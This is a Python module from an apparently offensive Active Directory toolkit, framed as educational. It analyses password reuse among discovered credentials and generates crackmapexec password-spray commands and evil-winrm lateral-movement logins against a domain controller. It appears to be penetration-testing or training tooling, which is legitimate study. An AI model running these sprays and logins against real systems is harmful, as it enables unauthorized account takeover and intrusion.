"""
Password Reuse Analysis

Tracks discovered credentials and identifies password reuse patterns.
Suggests spray attacks and prioritizes targets based on password overlap.

Educational purpose: Demonstrates why unique passwords matter and how
attackers pivot using credential reuse.

Example:
    tracker = PasswordReuseTracker()
    tracker.add_credential(cred1)
    tracker.add_credential(cred2)

    # Find password reuse
    reuse = tracker.analyze_reuse()
    for password, users in reuse.by_password.items():
        if len(users) > 1:
            print(f"Password reused by: {', '.join(users)}")

    # Get spray suggestions
    for step in tracker.get_spray_suggestions(all_users, context):
        print(f"{step.action}: {step.command}")
"""

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Set, Tuple
from collections import defaultdict

from .models import DiscoveredCredential, Confidence


@dataclass
class ReuseAnalysis:
    """
    Results from password reuse analysis.

    Groups credentials by password to identify reuse patterns.
    """
    # Password -> list of usernames
    by_password: Dict[str, List[str]] = field(default_factory=dict)

    # Username -> password (for lookup)
    by_user: Dict[str, str] = field(default_factory=dict)

    # Passwords used by multiple accounts
    reused_passwords: Set[str] = field(default_factory=set)

    # Statistics
    total_credentials: int = 0
    unique_passwords: int = 0
    reused_count: int = 0  # Passwords used more than once

    @property
    def reuse_rate(self) -> float:
        """Percentage of passwords that are reused."""
        if self.unique_passwords == 0:
            return 0.0
        return (self.reused_count / self.unique_passwords) * 100

    def get_users_with_password(self, password: str) -> List[str]:
        """Get all users with a specific password."""
        return self.by_password.get(password, [])

    def shares_password_with(self, username: str) -> List[str]:
        """Find other users with the same password."""
        password = self.by_user.get(username.lower())
        if not password:
            return []

        users = self.by_password.get(password, [])
        return [u for u in users if u.lower() != username.lower()]


@dataclass
class SpraySuggestion:
    """
    Suggestion for password spray attack.

    Includes the command, context, and educational explanation.
    """
    action: str
    command: str
    explanation: str
    priority: int = 1
    password: str = ""
    target_users: List[str] = field(default_factory=list)
    success_likelihood: str = "medium"  # low, medium, high


class PasswordReuseTracker:
    """
    Tracks and analyzes password reuse patterns.

    Aggregates credentials from multiple sources (config files, sprays,
    kerberoasting, etc.) and identifies reuse that enables lateral movement.
    """

    def __init__(self):
        self._credentials: List[DiscoveredCredential] = []
        self._by_password: Dict[str, List[DiscoveredCredential]] = defaultdict(list)
        self._by_user: Dict[str, DiscoveredCredential] = {}

    def add_credential(self, cred: DiscoveredCredential) -> bool:
        """
        Add a credential to tracking.

        Args:
            cred: Discovered credential to track

        Returns:
            True if this was a new credential, False if duplicate
        """
        # Normalize for comparison
        key = (cred.username.lower(), cred.secret)

        # Check for duplicate
        for existing in self._credentials:
            if (existing.username.lower(), existing.secret) == key:
                # Update confidence if new is higher
                if cred.confidence.value < existing.confidence.value:
                    existing.confidence = cred.confidence
                return False

        self._credentials.append(cred)
        self._by_password[cred.secret].append(cred)
        self._by_user[cred.username.lower()] = cred
        return True

    def add_credentials(self, creds: List[DiscoveredCredential]) -> int:
        """Add multiple credentials. Returns count of new additions."""
        return sum(1 for c in creds if self.add_credential(c))

    def analyze_reuse(self) -> ReuseAnalysis:
        """
        Analyze password reuse patterns.

        Returns:
            ReuseAnalysis with statistics and groupings
        """
        analysis = ReuseAnalysis()

        # Build mappings
        for password, creds in self._by_password.items():
            usernames = [c.username for c in creds]
            analysis.by_password[password] = usernames

            for username in usernames:
                analysis.by_user[username.lower()] = password

            if len(creds) > 1:
                analysis.reused_passwords.add(password)

        # Statistics
        analysis.total_credentials = len(self._credentials)
        analysis.unique_passwords = len(self._by_password)
        analysis.reused_count = len(analysis.reused_passwords)

        return analysis

    def get_spray_candidates(self) -> List[Tuple[str, List[str]]]:
        """
        Get passwords suitable for spraying with their source users.

        Prioritizes:
        1. Passwords already confirmed on multiple accounts (high reuse likelihood)
        2. Simple/common patterns (Password1, Welcome1, Company2024)
        3. Passwords from privileged accounts (admins reuse passwords)

        Returns:
            List of (password, source_users) tuples, sorted by spray potential
        """
        candidates = []

        for password, creds in self._by_password.items():
            # Score based on reuse potential
            score = 0

            # Already reused = high potential
            if len(creds) > 1:
                score += 50

            # Common patterns
            if self._is_common_pattern(password):
                score += 30

            # From privileged source
            if any(self._is_privileged_source(c) for c in creds):
                score += 20

            # Confirmed credentials are better
            if any(c.confidence == Confidence.CONFIRMED for c in creds):
                score += 10

            candidates.append((password, [c.username for c in creds], score))

        # Sort by score descending
        candidates.sort(key=lambda x: -x[2])

        return [(p, users) for p, users, _ in candidates]

    def _is_common_pattern(self, password: str) -> bool:
        """Check if password matches common reuse patterns."""
        patterns = [
            lambda p: p.lower().startswith('password'),
            lambda p: p.lower().startswith('welcome'),
            lambda p: p.lower().startswith('winter'),
            lambda p: p.lower().startswith('summer'),
            lambda p: p.lower().startswith('spring'),
            lambda p: p.lower().startswith('fall'),
            lambda p: any(c.isdigit() for c in p[-4:]),  # Ends with year
            lambda p: p.endswith('!') or p.endswith('1'),  # Common suffix
            lambda p: len(p) <= 10,  # Short passwords more likely reused
        ]

        return sum(1 for check in patterns if check(password)) >= 2

    def _is_privileged_source(self, cred: DiscoveredCredential) -> bool:
        """Check if credential is from a privileged context."""
        privileged_indicators = [
            'admin', 'svc_', 'svc-', 'sa_', 'sql', 'backup',
            'service', 'batch', 'job', 'schedule',
        ]

        username_lower = cred.username.lower()
        return any(ind in username_lower for ind in privileged_indicators)

    def get_spray_suggestions(
        self,
        target_users: List[str],
        context: Dict[str, str],
    ) -> List[SpraySuggestion]:
        """
        Generate spray attack suggestions based on discovered passwords.

        Args:
            target_users: List of usernames to potentially spray
            context: Target info (ip, domain, etc.)

        Returns:
            List of SpraySuggestion with commands and explanations
        """
        suggestions = []
        target = context.get('target_ip', '<DC_IP>')
        domain = context.get('domain', '<DOMAIN>')

        candidates = self.get_spray_candidates()
        analysis = self.analyze_reuse()

        if not candidates:
            return []

        # Suggestion 1: Spray with already-reused passwords
        if analysis.reused_passwords:
            reused = list(analysis.reused_passwords)[0]
            source_users = analysis.by_password[reused]

            suggestions.append(SpraySuggestion(
                action="Spray with confirmed reused password",
                command=f"crackmapexec smb {target} -u users.txt -p '{reused}' --continue-on-success",
                explanation=f"This password is already used by {len(source_users)} accounts "
                           f"({', '.join(source_users[:3])}). High likelihood of reuse elsewhere.",
                priority=1,
                password=reused,
                target_users=source_users,
                success_likelihood="high",
            ))

        # Suggestion 2: Spray top candidate
        if candidates:
            top_password, top_users = candidates[0]

            # Don't duplicate if same as above
            if not analysis.reused_passwords or top_password not in analysis.reused_passwords:
                suggestions.append(SpraySuggestion(
                    action="Spray with high-potential password",
                    command=f"crackmapexec smb {target} -u users.txt -p '{top_password}' --continue-on-success",
                    explanation=f"Password from {top_users[0]} matches common reuse patterns. "
                               "Users often reuse passwords across accounts.",
                    priority=2,
                    password=top_password,
                    target_users=top_users,
                    success_likelihood="medium",
                ))

        # Suggestion 3: Username-as-password spray
        discovered_users = [c.username for c in self._credentials]
        if discovered_users:
            suggestions.append(SpraySuggestion(
                action="Spray username-as-password",
                command=f"crackmapexec smb {target} -u users.txt -p users.txt --no-bruteforce --continue-on-success",
                explanation="Some users set their password to match their username, especially "
                           "for service accounts or newly created accounts with default passwords.",
                priority=3,
                success_likelihood="low",
            ))

        # Suggestion 4: Common password variants
        if candidates:
            base_password = candidates[0][0]
            suggestions.append(SpraySuggestion(
                action="Spray common variants",
                command=f"# Try: {base_password}1, {base_password}!, {base_password}123, {base_password}2024",
                explanation="Users often create 'unique' passwords by adding numbers or symbols. "
                           "Once you find one password, try common modifications.",
                priority=4,
                success_likelihood="medium",
            ))

        # Educational note
        suggestions.append(SpraySuggestion(
            action="Document spray results",
            command="# Add successful creds to bloodtrail: bloodtrail --add-creds <user>:<password>",
            explanation="Track all discovered credentials for attack chain visualization. "
                       "Bloodtrail correlates password reuse with AD attack paths.",
            priority=99,
            success_likelihood="low",
        ))

        return suggestions

    def get_lateral_movement_paths(
        self,
        current_user: str,
        context: Dict[str, str],
    ) -> List[SpraySuggestion]:
        """
        Suggest lateral movement based on password reuse.

        If current user's password is reused, we can move to those accounts.

        Args:
            current_user: Username we're currently operating as
            context: Target info

        Returns:
            List of lateral movement suggestions
        """
        suggestions = []
        target = context.get('target_ip', '<DC_IP>')

        analysis = self.analyze_reuse()
        shared = analysis.shares_password_with(current_user)

        if shared:
            password = analysis.by_user.get(current_user.lower(), '<PASSWORD>')

            for other_user in shared[:5]:  # Top 5 targets
                suggestions.append(SpraySuggestion(
                    action=f"Lateral move to {other_user}",
                    command=f"evil-winrm -i {target} -u '{other_user}' -p '{password}'",
                    explanation=f"Password reuse detected: {current_user} and {other_user} "
                               "share the same password. Try authentication.",
                    priority=1,
                    password=password,
                    target_users=[other_user],
                    success_likelihood="high",
                ))

        return suggestions

    def get_reuse_report(self) -> str:
        """
        Generate human-readable password reuse report.

        Returns:
            Formatted string report
        """
        analysis = self.analyze_reuse()

        lines = [
            "=" * 60,
            "PASSWORD REUSE ANALYSIS",
            "=" * 60,
            "",
            f"Total Credentials: {analysis.total_credentials}",
            f"Unique Passwords:  {analysis.unique_passwords}",
            f"Reused Passwords:  {analysis.reused_count}",
            f"Reuse Rate:        {analysis.reuse_rate:.1f}%",
            "",
        ]

        if analysis.reused_passwords:
            lines.append("-" * 40)
            lines.append("REUSED PASSWORDS:")
            lines.append("-" * 40)

            for password in analysis.reused_passwords:
                users = analysis.by_password[password]
                masked = password[:3] + '*' * (len(password) - 3)
                lines.append(f"\n  {masked} ({len(users)} accounts):")
                for user in users:
                    lines.append(f"    - {user}")

        lines.append("")
        lines.append("-" * 40)
        lines.append("EDUCATIONAL NOTES:")
        lines.append("-" * 40)
        lines.append("- Password reuse enables lateral movement")
        lines.append("- Service accounts often share passwords")
        lines.append("- Admins frequently use same password for DA and regular accounts")
        lines.append("- Next step: Spray discovered passwords against user list")
        lines.append("")

        return "\n".join(lines)

    def to_dict(self) -> Dict:
        """Export tracker state for serialization."""
        return {
            "credentials": [
                {
                    "username": c.username,
                    "domain": c.domain,
                    "source": c.source,
                    "source_type": c.source_type.value,
                    "confidence": c.confidence.value,
                }
                for c in self._credentials
            ],
            "analysis": {
                "total": len(self._credentials),
                "unique_passwords": len(self._by_password),
                "reused": len([p for p, c in self._by_password.items() if len(c) > 1]),
            }
        }
